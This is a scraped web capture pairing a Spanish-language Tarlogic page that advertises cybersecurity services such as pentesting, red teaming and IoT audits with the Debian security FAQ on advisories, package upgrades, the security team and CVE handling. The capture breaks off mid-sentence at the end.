### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.tarlogic.com_6eafb5f8_20250126_110405.html ===


* [Inicio](https://www.tarlogic.com/es/)
* [Servicios](https://www.tarlogic.com/es/servicios-ciberseguridad/ "Servicios de ciberseguridad")
  + Servicios de tests de intrusion avanzados
    - [Red Team](https://www.tarlogic.com/es/servicios-red-team/ "Servicios de Red Team")
    - [Pentesting interno y externo](https://www.tarlogic.com/es/pentesting/ "servicios de tests de intrusión")
    - [Test de ingeniería social](https://www.tarlogic.com/es/ingenieria-social/ "servicios de Ingeniería social y phishing")
    - [Pentesting WiFi](https://www.tarlogic.com/es/auditoria-seguridad-wifi/ "servicio de pentest WiFi")
    - Servicios de ciberinteligencia
    - [Vigilancia digital](https://www.tarlogic.com/es/vigilancia-digital/)
    - [Threat Intelligence](https://www.tarlogic.com/es/threat-intelligence/ "Inteligencia de amenazas")
    - [Investigación y análisis de fraude](https://www.tarlogic.com/es/investigacion-y-analisis-de-fraude/ "Análisis de fraude")
    - [Ciberinteligencia estratégica](https://www.tarlogic.com/es/ciberinteligencia-estrategica/ "Inteligencia estratégica")
  + Servicios de auditoria de seguridad
    - [Auditoría de seguridad web](https://www.tarlogic.com/es/auditoria-seguridad-web/)
    - [Auditoría de seguridad de aplicaciones móviles](https://www.tarlogic.com/es/auditoria-aplicaciones-moviles/ "Auditoría de aplicaciones móviles")
    - [Auditoría de seguridad IOT](https://www.tarlogic.com/es/auditoria-seguridad-iot/)
    - [Auditoría de Seguridad de infraestructuras en la nube](https://www.tarlogic.com/es/auditoria-seguridad-cloud/ "Auditoría de seguridad cloud")
    - [Auditoría de código fuente](https://www.tarlogic.com/es/auditoria-codigo-fuente/ "Auditoría de código")
    - [Servicios de ingeniería inversa y hardware hacking](https://www.tarlogic.com/es/hardware-hacking-ingenieria-inversa/ "Ingeniería inversa y hardware hacking")
    - [Bastionado de sistemas operativos y tecnologías](https://www.tarlogic.com/es/bastionado-sistemas-hardening/ "Bastionado")
    - [Auditoría de seguridad en entornos bancarios avanzados](https://www.tarlogic.com/es/auditoria-seguridad-entornos-bancarios/ "seguridad banca")
  + Reduccion de superficie de ataque
    - [Gestión de vulnerabilidades](https://www.tarlogic.com/es/gestion-vulnerabilidades/ "Servicio de gestión de vulnerabilidades")
    - [vulnerabilidades emergentes 24×7](https://www.tarlogic.com/es/vulnerabilidades-emergentes/ "servicio de vulnerabilidades emergentes")
    - [Pruebas de denegación de servicio (DoS)](https://www.tarlogic.com/es/dos-test/ "Pruebas DoS")
    - [Programas de Bug Bounty](https://www.tarlogic.com/es/bug-bounty/ "Gestión de programas de Bug Bounty")
    - [Riesgo dinámico y Priorización de Amenazas](https://www.tarlogic.com/es/priorizacion-amenazas/ "Priorización de amenazas")
    - Proteccion y respuesta
    - [Servicios de Threat Hunting](https://www.tarlogic.com/es/threat-hunting/)
    - [Servicios de Respuesta ante Incidentes](https://www.tarlogic.com/es/respuesta-incidentes/ "Respuesta ante Incidentes")
* [BlackArrow](https://www.tarlogic.com/es/blackarrow/)
* [Blog](https://www.tarlogic.com/es/blog/ "Blog Ciberseguridad")
* [Contacto](https://www.tarlogic.com/es/contacto/ "Contactar con tarlogic")
* [ES](https://www.tarlogic.com/es/servicios-ciberseguridad/ "ES")
  + [EN](https://www.tarlogic.com/cybersecurity-services/ "EN")
  + [IT](https://www.tarlogic.com/it/servizi-cibersicurezza/ "IT")

* ES
  + [EN](https://www.tarlogic.com/cybersecurity-services/)
  + [IT](https://www.tarlogic.com/it/servizi-cibersicurezza/)

![servicios de ciberseguridad](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/servicios_ciberseguridad_blur.webp)

# La nueva generación de servicios de Ciberseguridad

Nuestros servicios de ciberseguridad se enfocan en resolver las necesidades de los clientes. Sabemos a qué riesgos se exponen y cómo protegerlos

[Contacto](https://www.tarlogic.com/es/contacto/)

![cybersecurity team shield](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/cybersecurity-team-shield.png)

[Inicio](https://www.tarlogic.com/es/)
/
Servicios de ciberseguridad

![Servicios de test de intrusion](data:image/gif;base64...)

## Pentesting - Tests de intrusión avanzados

### Identificamos amenazas, explotamos vulnerabilidades

Identificar, explotar y mitigar. Nuestro equipo de pentesters simulará ciberataques para detectar las debilidades a las que se enfrenta su empresa y propondrá soluciones para atenuar el impacto que producen. Contar con **servicios de ciberseguridad** de esta naturaleza permitirá a su empresa y organización detectar las amenazas y vulnerabilidades que se ciernen sobre su negocio.

[Servicio de pentesting](https://www.tarlogic.com/es/pentesting/)

## Servicios de gestión de vulnerabilidades

### Gestionamos sus vulnerabilidades en aplicaciones e infraestructura

El servicio de gestión de vulnerabilidades proactivo y 24/7 de Tarlogic protege su negocio de las últimas amenazas, reduce el tiempo de exposición y garantiza la correcta resolución de las vulnerabilidades.

[Gestión de vulnerabilidades](https://www.tarlogic.com/es/gestion-vulnerabilidades/)

![Aseoramiento en seguridad a medida de su empresa](data:image/gif;base64...)

![Servicios de seguridad IoT](data:image/gif;base64...)

## Servicios de seguridad IoT

### Garantizamos la seguridad de sus dispositivos IoT

Simulamos ciberataques del mundo real en sus dispositivos IoT para identificar vulnerabilidades. Nuestros servicios de **pentesting IoT** le ayudan a identificar y mitigar vulnerabilidades en el software, firmware y poniendo atención especial a las comunicaciones (Bluetooth,..).

Probamos la seguridad de los servicios, aplicaciones y protocolos de tus dispositivos IoT para que puedas mantenerlos a salvo de los ciberataques.

[Servicios de seguridad IoT](https://www.tarlogic.com/es/auditoria-seguridad-iot/)

![Servicios de ciberseguridad globales](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/hero_cyber_blur.webp)

#### Ciberseguridad con alto componente técnico que contribuye a la mejora de los procesos de Gobierno, Riesgos y Cumplimiento

## Nuestros servicios de ciberseguridad

Somos un proveedor boutique de ciberseguridad que ofrece servicios de auditoría de seguridad especializados, con el objetivo de minimizar los riesgos en su organización.

### SERVICIOS DE TESTS DE INTRUSIÓN AVANZADOS

Ofrecemos servicios avanzados de seguridad ofensiva para evaluar la seguridad de la infraestructura de red de su organización, mediante ejercicios de Red Team y pruebas de intrusión a través de diversos vectores de ataque.

#### [Pentest internos y externos Pentest internos y externos](https://www.tarlogic.com/es/pentesting/ "servicios de pentesting")

#### [Servicios de Red Team Servicios de Red Team](https://www.tarlogic.com/es/servicios-red-team/ "servicios de Red Team")

#### [Pentest WiFi Pentest WiFi](https://www.tarlogic.com/es/auditoria-seguridad-wifi/ "Pentest Wifi")

#### [Ingeniería social Ingeniería social](https://www.tarlogic.com/es/ingenieria-social/ "Ingeniería social")

### SERVICIOS DE AUDITORÍA DE SEGURIDAD

Evaluamos la seguridad de aplicaciones (Análisis SAST y DAST) y sistemas de acuerdo a normativas internacionales y metodologías de referencia.

#### [Auditoría de seguridad web Auditoría de seguridad web](https://www.tarlogic.com/es/auditoria-seguridad-web/ "Auditoría de seguridad Web")

#### [Auditoría de seguridad de aplicaciones móviles Auditoría de seguridad de aplicaciones móviles](https://www.tarlogic.com/es/auditoria-aplicaciones-moviles/ "Auditoría de aplicaciones móviles")

#### [Auditoría de seguridad en entornos bancarios avanzados Auditoría de seguridad en entornos bancarios avanzados](https://www.tarlogic.com/es/auditoria-seguridad-entornos-bancarios/ "auditoría PSD2")

#### [Seguridad IOT Seguridad IOT](https://www.tarlogic.com/es/auditoria-seguridad-iot/ "Auditoría de seguridad IoT")

#### [Ingeniería Inversa y Hardware Hacking Ingeniería Inversa y Hardware Hacking](https://www.tarlogic.com/es/hardware-hacking-ingenieria-inversa/ "Servicios de ingeniería inversa y hardware hacking")

#### [Auditoría de Seguridad de infraestructuras en la nube Auditoría de Seguridad de infraestructuras en la nube](https://www.tarlogic.com/es/auditoria-seguridad-cloud/ "Auditoría de Seguridad Cloud")

#### [Auditoría de código Auditoría de código](https://www.tarlogic.com/es/auditoria-codigo-fuente/ "Auditoría de código")

#### [Bastionado de sistemas operativos y tecnologías Bastionado de sistemas operativos y tecnologías](https://www.tarlogic.com/es/bastionado-sistemas-hardening/ "bastionado")

### SERVICIOS DE REDUCCIÓN DE SUPERFICIE DE ATAQUE

Servicios diseñados para reducir la superficie de exposición. Desde nuestra unidad **S.T.A².R.S** *(Surface Technical Assessment & Attack Reduction Service)* gestionamos sus vulnerabilidades, priorizándolas y ayudando a su mitigación.

#### [Gestión de vulnerabilidades Gestión de vulnerabilidades](https://www.tarlogic.com/es/gestion-vulnerabilidades/ "Gestión de vulnerabilidades")

#### [Vulnerabilidades emergentes 24x7 Vulnerabilidades emergentes 24x7](https://www.tarlogic.com/es/vulnerabilidades-emergentes/ "Servicio de vulnerabilidades emergentes 24x7")

#### [Pruebas de denegación de servicio (DoS) Pruebas de denegación de servicio (DoS)](https://www.tarlogic.com/es/dos-test/ "Test DoS ")

#### [Auditoría de código fuente Auditoría de código fuente](https://www.tarlogic.com/es/auditoria-codigo-fuente/ "Auditoría de código")

#### [Programas de Bug Bounty Programas de Bug Bounty](https://www.tarlogic.com/es/bug-bounty/ "Bug bounty gestionado")

#### [Riesgos dinámicos de ciberseguridad Riesgos dinámicos de ciberseguridad](https://www.tarlogic.com/es/priorizacion-amenazas/ "Priorización de ciberamenazas")

### DETECCIÓN Y RESPUESTA

Monitorizamos y prevenimos incidentes 24/7 con servicios altamente especializados MDR y respondemos ante incidentes de seguridad (IR).

#### [Servicios de Threat Hunting - MDR Servicios de Threat Hunting - MDR](https://www.tarlogic.com/es/threat-hunting/ "Threat Hunting")

#### [Servicios de respuesta a incidentes - MDR Servicios de respuesta a incidentes - MDR](https://www.tarlogic.com/es/respuesta-incidentes/ "Incident response")

### Servicios de ciberinteligencia

Aportamos información de valor y resolvemos problemas complejos con la ayuda de la [ciberinteligencia](https://www.tarlogic.com/es/ciberinteligencia/ "ciberinteligencia").

#### [Servicios de vigilancia digital Servicios de vigilancia digital](https://www.tarlogic.com/es/vigilancia-digital/ "Vigilancia digital")

#### [Investigación y análisis de fraude Investigación y análisis de fraude](https://www.tarlogic.com/es/investigacion-y-analisis-de-fraude/ "Investigación y análisis de fraude")

#### [Threat intelligence Threat intelligence](https://www.tarlogic.com/es/threat-intelligence/ "Inteligencia de amenazas")

#### [Ciberinteligencia estratégica Ciberinteligencia estratégica](https://www.tarlogic.com/es/ciberinteligencia-estrategica/ "Ciberinteligencia estratégica")

#### [Formación Formación](https://www.tarlogic.com/es/formacion/)

## Preguntas frecuentes sobre servicios de ciberseguridad

### ¿Qué servicios prestan las empresas de ciberseguridad?

Las empresas de ciberseguridad prestan fundamentalmente servicios que ayudan a **identificar** vectores de ataque, a cuantificar el impacto para los usuarios y para el negocio y por último a **prevenir** incidentes de seguridad mitigando **vulnerabilidades** o diseñando un plan de ciberseguridad a medida.

Estos servicios están orientados a detectar vulnerabilidades (**auditoría técnica** de seguridad) y a verificar si una vulnerabilidad puede ser aprovechada por un atacante que se aproveche de ella (servicios de **pentesting**).

Dentro de esta sencilla clasificación inicial se esconden **trabajos de ciberseguridad** muy variados y de alta especialización, que incluyen trabajos de pentesting sobre tecnologías web, móvil, cloud, infraestructura como Active directory, entornos OT e IOT y ejercicios de simulación.

### ¿Quién necesita servicios de ciberseguridad?

Todas las empresas requieren servicios de ciberseguridad, si bien esta necesidad se ve incrementada cuando la seguridad de la información y de los sistemas tiene impacto en datos personales especialmente sensibles (**GDPR**) , es requerido por aspectos regulatorios (**DORA**, **TIBER**, ..) , o tiene impacto directo en la seguridad de las personas (infraestructuras OT,..)

A mayor nivel de interconexión, exposición y dependencia de la tecnología, mayor deberá ser la inversión en ciberseguridad para evitar incidentes. Esto es especialmente relevante cuando un proveedor o tecnología forma parte de una cadena de suministro, pudiendo impactar en la seguridad de muchas empresas.

Históricamente los sectores de banca y seguros son los que más han invertido en ciberseguridad.

### ¿Cuáles son los principales problemas de la ciberseguridad?

El uso de mecanismos de seguridad inseguros (**contraseñas** débiles, ausencia de segundo factor de autenticación), unido con el **phishing** y el uso de software desactualizado que presenta vulnerabilidades son los principales problemas de seguridad a los que se enfrentan las compañías.

Los servicios de ciberseguridad ayudan a corregir problemas de seguridad en todas las capas, desde el **desarrollo** y código fuente, a **aplicaciones**, infraestructura y **comunicaciones**.

### ¿Qué herramientas se utilizan en ciberseguridad?

En ciberseguridad se usan un gran número de herramientas tanto para la detección de vulnerabilidades como para explotarlas. Existen multitud de herramientas comerciales y open source para cualquier tecnología a auditar, por lo que un pentester debe recurrir a muchas de estas herramientas a lo largo de su jornada.

La distribución Kali Linux es una de las más conocidas e incluye una amplia suite de herramientas de análisis de seguridad entre las que podemos encontrar herramientas de **reconocimiento** (OSINT) y escaneo **de puertos** (nmap, hping, ..), herramientas de seguridad WiFi, voip, Web ,  frameworks de **explotación de vulnerabilidades**,  análisis forense, cracking o **ingeniería inversa**.

Además de las herramientas de auditoría, existen un número importante de tecnologías orientadas a la parte de **protección**, **monitorización** y **respuesta** ante incidentes de seguridad.

## ¿Podemos ayudarle en algo?

Contacte con nuestro equipo de ciberseguridad para cualquier pregunta o asesoramiento

[Contacto](https://www.tarlogic.com/es/contacto/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### UNIDADES DE NEGOCIO

* [CIBERSEGURIDAD](https://www.tarlogic.com/es/servicios-ciberseguridad/ "SERVICIOS DE CIBERSEGURIDAD")
* [CIBERINTELIGENCIA](https://www.tarlogic.com/es/ciberinteligencia/ "SERVICIOS DE CIBERINTELIGENCIA")
* [BLACKARROW](https://www.tarlogic.com/es/blackarrow/ "SERVICIOS DE BLACKARROW")

###### INFORMACIÓN DE CONTACTO

[Santiago de Compostela
 Travesía do Montouto Nº1,
 Teo, A Coruña.
 C.P.15894](https://www.google.com/maps?cid=5632903913199661680)
 (+34) 912 919 319

 contacto@tarlogic.com
[Madrid
 Calle Quintanavides 13-23,
 Parque empresarial Vía Norte edificio 2,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)

###### ENLACES

* [Productos Ciberseguridad](https://www.tarlogic.com/es/productos/)
* [Empleo ciberseguridad](https://www.tarlogic.com/es/empleo-ciberseguridad/)
* [Empresa ciberseguridad (Nosotros)](https://www.tarlogic.com/es/sobre-tarlogic/)
* [Últimas novedades](https://www.tarlogic.com/es/actualidad/)
* [Glosario de ciberseguridad](https://www.tarlogic.com/es/glosario-ciberseguridad/)
* [BSAM Metodología seguridad Bluetooth](https://www.tarlogic.com/bsam/es/)
* [Sectores](https://www.tarlogic.com/es/sectores/)
* [Canal de partners](https://www.tarlogic.com/es/partners/)

© 2025 Todos los derechos reservados Tarlogic Security | Expertos en ciberseguridad y ciberinteligencia

[Política de privacidad](https://www.tarlogic.com/es/politica-de-privacidad/) - [Aviso legal](https://www.tarlogic.com/es/aviso-legal/) - [Política de gestión](https://www.tarlogic.com/es/politica-de-gestion/) - [Política de cookies](https://www.tarlogic.com/es/politica-de-cookies/) - [Canal de denuncias](https://tarlogic-security.factorialhr.es/complaints)

Utilizamos cookies para ofrecerte la mejor experiencia en nuestra web. Puedes aprender más sobre qué cookies utilizamos o desactivarlas en los Ajustes de cookies

Acepto

###### Necesary

Las cookies estrictamente necesarias tiene que activarse siempre para que podamos guardar tus preferencias de ajustes de cookies.

Cookies necesarias
###### Cookies de terceros

Esta web utiliza Google Analytics para recopilar información anónima tal como el número de visitantes del sitio, o las páginas más populares.
Dejar esta cookie activa nos permite mejorar nuestra web.

Cookies de terceros

Activar todo
Guardar ajustes
[Política de cookies](https://www.tarlogic.com/es/politica-de-cookies/)

[Contáctenos ahora 💬](#top)



=== Content from www.debian.org_2c992b25_20250126_110407.html ===

[![Debian](../Pics/openlogo-50.png)](../ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

[Security Information](./)
/
Debian security FAQ

# Debian security FAQ

1. [I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?](#buthow)- [The signature on your advisories does not verify correctly!](#signature)- [How is security handled in Debian?](#handling)- [Why are you fiddling with an old version of that package?](#oldversion)- [The version number for a package indicates that I am still running a vulnerable version!](#version)- [I received an advisory, but the build for one processor architecture seems to be missing.](#archismissing)- [How is security handled for unstable?](#unstable)- [How is security handled for testing?](#testing)- [How is security handled for contrib, non-free and non-free-firmware?](#contrib)- [The advisory says unstable is fixed in version 1.2.3-1, but unstable has 1.2.5-1, what's up?](#sidversionisold)- [Why are there no official mirrors for security.debian.org?](#mirror)- [I've seen DSA 100 and DSA 102, now where is DSA 101?](#missing)- [How can I reach the security team?](#contact)- [I guess I found a security problem, what should I do?](#discover)- [What am I supposed to do with a security problem in one of my packages?](#care)- [I tried to download a package listed in one of the security advisories, but I got a `file not found' error.](#enofile)- [I've got a bugfix, can I upload to security.debian.org directly?](#upload)- [I've got a bugfix, can I upload to proposed-updates instead?](#ppu)- [I'm pretty sure my packages are fine, how can I upload them?](#SecurityUploadQueue)- [How can I help with security?](#help)- [What is the scope of proposed-updates?](#proposed-updates)- [How is the security team composed?](#composing)- [How long will security updates be provided?](#lifespan)- [How can I check the integrity of packages?](#check)- [What to do if a random package breaks after a security update?](#break)- [What is a CVE identifier?](#cvewhat)- [Does Debian issue a DSA for every CVE id?](#cvedsa)- [Can Debian assign CVE identifiers?](#cveget)- [Does Debian have a vulnerability disclosure policy?](#disclosure-policy)- [Our vulnerability management tool has shown that the following issues are open (list of CVEs with random CVSS scores). When are those going to be fixed?](#cve-severity-assessment)- [What does local (remote) mean?](#localremote)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
